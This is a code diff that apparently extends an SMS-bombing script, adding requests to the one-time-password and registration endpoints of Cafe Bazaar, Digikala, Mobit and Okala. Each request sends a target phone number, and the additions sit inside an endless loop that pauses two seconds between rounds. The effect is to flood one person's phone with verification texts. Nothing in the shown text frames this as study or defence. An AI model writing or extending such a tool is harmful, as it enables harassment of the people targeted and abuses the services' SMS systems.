@@ -268,4 +268,36 @@ while True:
     safirstores_req = requests.post(safirstores_url, data=safirstores_payload, json=rhead)
     print('SafirStores: ' + str(safirstores_req.status_code))
 
+    #Baazar
+    bazaar_url = 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest'
+    bazaar_payload = {"properties": {"language": 2, "clientVersion": "web"},
+                      "singleRequest": {"getOtpTokenRequest": {"username": "98%s" % number}},}
+    bazaar_req = requests.post(bazaar_url, json=bazaar_payload, headers=rhead)
+    print('Bazaar: '+str(bazaar_req.status_code))
+
+    #Digikala
+    digikala_url = 'https://api.digikala.com/v1/user/authenticate/'
+    digikala_payload = {"backUrl": "/",
+                "username": "0%s" % number,
+                "otp_call": "false",}
+    digikala_req = requests.post(digikala_url, json=digikala_payload, headers=rhead)
+    print('Digikala: '+str(digikala_req.status_code))
+
+    #Mobit
+    mobit_url = 'https://api.mobit.ir/api/web/v8/register/register'
+    mobit_payload = {"number": "0%s" % number}
+    mobit_req = requests.post(mobit_url, json=mobit_payload, headers=rhead)
+    print('Mobit: '+str(mobit_req.status_code))
+
+    #Okala
+    okala_url = 'https://api-react.okala.com/C/CustomerAccount/OTPRegister'
+    okala_payload = {
+            "mobile": "0%s" % number,
+            "deviceTypeCode": 0,
+            "confirmTerms": "true",
+            "notRobot": "false",
+        }
+    okala_req = requests.post(okala_url, json=okala_payload, headers=rhead)
+    print('Okala: '+str(okala_req.status_code))
+
     sleep(2)
